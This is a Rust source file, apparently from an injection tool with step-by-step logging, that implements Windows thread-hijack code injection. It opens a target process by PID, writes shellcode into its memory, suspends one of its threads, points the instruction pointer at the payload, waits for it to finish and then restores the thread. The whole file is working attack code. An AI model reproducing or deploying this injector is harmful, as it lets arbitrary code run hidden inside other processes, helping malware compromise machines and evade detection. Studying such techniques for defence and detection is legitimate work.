use crate::injection::InjectionResult;
use crate::log::LogSink;

#[cfg(windows)]
pub fn live_inject(
    pid: u32,
    shellcode: &[u8],
    log: &LogSink,
) -> Result<InjectionResult, String> {
    use super::common::{free_remote, write_remote_payload};
    use super::wrappers::wrap_for_hijack;
    use crate::resolve;

    const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
    const PROCESS_VM_OPERATION: u32 = 0x0008;
    const PROCESS_VM_READ: u32 = 0x0010;
    const PROCESS_VM_WRITE: u32 = 0x0020;
    const THREAD_GET_CONTEXT: u32 = 0x0008;
    const THREAD_SET_CONTEXT: u32 = 0x0010;
    const THREAD_SUSPEND_RESUME: u32 = 0x0002;
    const TH32CS_SNAPTHREAD: u32 = 0x00000004;
    const CONTEXT_ALL: u32 = 0x10001F;

    #[repr(C)]
    struct THREADENTRY32 {
        dw_size: u32,
        cnt_usage: u32,
        th32_thread_id: u32,
        th32_owner_process_id: u32,
        tp_base_pri: i32,
        tp_delta_pri: i32,
        dw_flags: u32,
    }

    // x86_64 CONTEXT is 1232 bytes; we use a raw byte buffer and known field offsets
    const CONTEXT_SIZE: usize = 1232;
    const RIP_OFFSET: usize = 0xF8; // offsetof(CONTEXT, Rip)
    const CONTEXT_FLAGS_OFFSET: usize = 0x30;

    log.step(format!(
        "[1/7] OpenProcess(PID {}) — PROCESS_QUERY_INFORMATION | PROCESS_VM_*",
        pid
    ));
    let process_access =
        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE;
    let process = unsafe { resolve::OpenProcess(process_access, 0, pid) };
    if process.is_null() {
        return Err("OpenProcess failed (check privileges — try from an elevated shell)".to_string());
    }

    let wrapped = wrap_for_hijack(shellcode);
    let size = wrapped.len();
    let flag_offset = size - 1;
    let base = write_remote_payload(process, &wrapped, 7, log)?;

    log.step("[5/7] SuspendThread — finding and suspending a target thread");

    let snapshot = unsafe { resolve::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
    let invalid_handle = -1isize as *mut std::ffi::c_void;
    if snapshot.is_null() || snapshot == invalid_handle {
        free_remote(process, base, log);
        return Err("CreateToolhelp32Snapshot failed".to_string());
    }

    let mut entry: THREADENTRY32 = unsafe { std::mem::zeroed() };
    entry.dw_size = std::mem::size_of::<THREADENTRY32>() as u32;

    let mut target_tid: Option<u32> = None;
    if unsafe { resolve::Thread32First(snapshot, &mut entry as *mut _ as *mut std::ffi::c_void) } != 0 {
        loop {
            if entry.th32_owner_process_id == pid {
                target_tid = Some(entry.th32_thread_id);
                break;
            }
            if unsafe { resolve::Thread32Next(snapshot, &mut entry as *mut _ as *mut std::ffi::c_void) } == 0 {
                break;
            }
        }
    }
    unsafe { resolve::CloseHandle(snapshot) };

    let tid = match target_tid {
        Some(t) => t,
        None => {
            free_remote(process, base, log);
            unsafe { resolve::CloseHandle(process) };
            return Err(format!("no threads found for PID {}", pid));
        }
    };

    let thread_access = THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME;
    let thread = unsafe { resolve::OpenThread(thread_access, 0, tid) };
    if thread.is_null() {
        free_remote(process, base, log);
        unsafe { resolve::CloseHandle(process) };
        return Err(format!("OpenThread(TID {}) failed", tid));
    }

    let suspend_result = unsafe { resolve::SuspendThread(thread) };
    if suspend_result == u32::MAX {
        unsafe { resolve::CloseHandle(thread) };
        free_remote(process, base, log);
        unsafe { resolve::CloseHandle(process) };
        return Err(format!("SuspendThread(TID {}) failed", tid));
    }
    log.info(format!("      suspended thread TID {}", tid));

    log.step("[6/7] SetThreadContext — redirecting RIP to shellcode");

    let mut context_buf = vec![0u8; CONTEXT_SIZE];
    let context_ptr = context_buf.as_mut_ptr() as *mut std::ffi::c_void;

    // Set ContextFlags = CONTEXT_ALL
    unsafe {
        *(context_buf.as_mut_ptr().add(CONTEXT_FLAGS_OFFSET) as *mut u32) = CONTEXT_ALL;
    }

    if unsafe { resolve::GetThreadContext(thread, context_ptr) } == 0 {
        unsafe { resolve::ResumeThread(thread) };
        unsafe { resolve::CloseHandle(thread) };
        free_remote(process, base, log);
        unsafe { resolve::CloseHandle(process) };
        return Err("GetThreadContext failed".to_string());
    }

    let original_rip = unsafe { *(context_buf.as_ptr().add(RIP_OFFSET) as *const u64) };
    log.info(format!("      original RIP: 0x{:X}", original_rip));

    let saved_context = context_buf.clone();

    // Set RIP to shellcode
    unsafe {
        *(context_buf.as_mut_ptr().add(RIP_OFFSET) as *mut u64) = base as u64;
    }
    if unsafe { resolve::SetThreadContext(thread, context_ptr as *const std::ffi::c_void) } == 0 {
        unsafe { resolve::ResumeThread(thread) };
        unsafe { resolve::CloseHandle(thread) };
        free_remote(process, base, log);
        unsafe { resolve::CloseHandle(process) };
        return Err("SetThreadContext failed".to_string());
    }
    log.info(format!("      RIP redirected to shellcode at {:#p}", base));

    unsafe { resolve::ResumeThread(thread) };
    log.info("      thread resumed — shellcode executing");

    log.step("[7/7] WaitForCompletion — polling flag + restoring original context");

    let flag_addr = unsafe { (base as *const u8).add(flag_offset) };
    let mut flag_value: u8 = 0;
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
    let mut completed = false;

    loop {
        let ok = unsafe {
            resolve::ReadProcessMemory(
                process,
                flag_addr as *const std::ffi::c_void,
                &mut flag_value as *mut u8,
                1,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 {
            break;
        }
        if flag_value == 1 {
            completed = true;
            break;
        }
        if std::time::Instant::now() > deadline {
            log.warning("      timeout waiting for shellcode completion (5s)");
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(50));
    }

    unsafe { resolve::SuspendThread(thread) };
    let restore_ptr = saved_context.as_ptr() as *const std::ffi::c_void;
    if unsafe { resolve::SetThreadContext(thread, restore_ptr) } == 0 {
        log.warning("      SetThreadContext (restore) failed".to_string());
    } else {
        log.info(format!(
            "      original context restored (RIP: 0x{:X})",
            original_rip
        ));
    }
    unsafe { resolve::ResumeThread(thread) };
    unsafe { resolve::CloseHandle(thread) };
    unsafe { resolve::CloseHandle(process) };

    if completed {
        log.info("      shellcode completed, thread continues normally");
    } else {
        log.warning("      shellcode may not have completed — context restored anyway");
    }

    log.info(format!(
        "      shellcode at remote address {:#p} ({} bytes, wrapped {}+83)",
        base,
        size,
        size - 83
    ));
    Ok(InjectionResult {
        remote_base: base as u64,
        size,
    })
}

#[cfg(not(windows))]
pub fn live_inject(
    _pid: u32,
    _shellcode: &[u8],
    _log: &LogSink,
) -> Result<InjectionResult, String> {
    Err("live injection requires Windows — this build is running on a non-Windows host".to_string())
}
